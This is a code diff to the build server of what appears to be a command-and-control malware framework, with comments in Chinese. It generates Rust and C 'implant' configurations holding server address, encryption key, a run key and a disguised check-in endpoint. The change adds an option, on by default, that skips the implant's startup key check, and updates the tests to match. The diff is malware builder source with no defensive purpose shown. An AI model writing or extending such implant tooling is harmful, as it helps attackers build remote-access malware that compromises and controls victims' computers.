@@ -518,10 +518,17 @@ pub struct BuildRequest {
     /// Implant 类型: "rust" 或 "c" (默认 "rust")
     #[serde(default = "default_implant_type")]
     pub implant_type: String,
+    /// 是否跳过启动密钥检查 (默认 true)
+    #[serde(default = "default_skip_key_check")]
+    pub skip_key_check: bool,
 }
 
 fn default_implant_type() -> String {
     "rust".to_string()
+}
+
+fn default_skip_key_check() -> bool {
+    true
 }
 
 #[derive(Debug, Serialize)]
@@ -781,7 +788,7 @@ pub const VERSION: &str = "1.0.0";
 pub const ENCRYPTION_KEY: &str = "{}";
 
 /// 是否跳过启动密钥检查
-pub const SKIP_KEY_CHECK: bool = true;
+pub const SKIP_KEY_CHECK: bool = {};
 
 /// 获取服务器 HTTP URL
 pub fn get_http_url() -> String {{
@@ -795,7 +802,7 @@ pub fn get_server_port() -> u16 {{ SERVER_PORT }}
 pub fn get_use_tls() -> bool {{ USE_TLS }}
 pub fn get_tag() -> &'static str {{ TAG }}
 pub fn get_encryption_key() -> &'static str {{ ENCRYPTION_KEY }}
-"#, host, request.server_port, request.use_tls, tag, key)
+"#, host, request.server_port, request.use_tls, tag, key, request.skip_key_check)
 }
 
 /// 递归复制目录
@@ -888,7 +895,7 @@ fn generate_c_config(request: &BuildRequest) -> String {
 
 // Run Key (for execution validation)
 #define RUN_KEY "321"
-#define SKIP_KEY_CHECK 0
+#define SKIP_KEY_CHECK {}
 
 // API Paths (all requests go to same endpoint, type is in encrypted payload)
 #define API_CHECKIN "/api/CpHDCPSvc"
@@ -911,7 +918,7 @@ fn generate_c_config(request: &BuildRequest) -> String {
 #endif
 
 #endif // CONFIG_H
-"#, host, request.server_port, use_tls, tag, key)
+"#, host, request.server_port, use_tls, tag, key, if request.skip_key_check { 1 } else { 0 })
 }
 
 /// 编译 C Implant (使用 MinGW-w64 交叉编译)
@@ -1143,6 +1150,7 @@ mod tests {
             output_name: "test".to_string(),
             encryption_key: "a".repeat(64),
             implant_type: "rust".to_string(),
+            skip_key_check: true,
         };
         let config = generate_rust_config(&req);
         
@@ -1163,6 +1171,7 @@ mod tests {
             output_name: "test.exe".to_string(),
             encryption_key: "b".repeat(64),
             implant_type: "c".to_string(),
+            skip_key_check: true,
         };
         let config = generate_c_config(&req);
         
@@ -1182,6 +1191,7 @@ mod tests {
             output_name: "test".to_string(),
             encryption_key: "c".repeat(64),
             implant_type: "rust".to_string(),
+            skip_key_check: true,
         };
         
         let rust_config = generate_rust_config(&req);
